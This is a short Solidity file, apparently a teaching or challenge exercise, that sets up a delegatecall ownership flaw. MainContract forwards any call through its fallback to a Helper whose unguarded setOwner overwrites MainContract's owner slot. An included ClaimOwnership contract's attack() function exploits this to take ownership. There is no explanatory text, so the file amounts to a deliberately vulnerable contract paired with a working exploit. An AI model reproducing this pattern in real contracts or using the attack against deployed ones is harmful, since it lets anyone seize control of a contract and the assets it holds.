// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

contract Helper {
    address public owner;

    function setOwner(address _owner) public {
        owner = _owner;
    }
}

contract MainContract {
    address public owner;
    Helper public helper;

    constructor(address _helper) {
        owner = msg.sender;
        helper = Helper(_helper);
    }

    fallback() external {
        (bool success, ) = address(helper).delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }

    function SetOwner(address _newOwner) public {
        require(msg.sender == owner, "Caller is not the owner");
        bytes memory data = abi.encodeWithSignature("setOwner(address)", _newOwner);
        (bool success,) = address(helper).delegatecall(data);
        require(success, "Delegatecall to setOwner failed");
    }
}

contract ClaimOwnership {
    address public mainContract;

    constructor(address _mainContract) {
        mainContract = _mainContract;
    }

    function attack(address _newOwner) public {
        (bool success,) = mainContract.call(
            abi.encodeWithSignature("setOwner(address)", _newOwner)
            );
        require(success, "Delegatecall to setOwner failed");
    }
}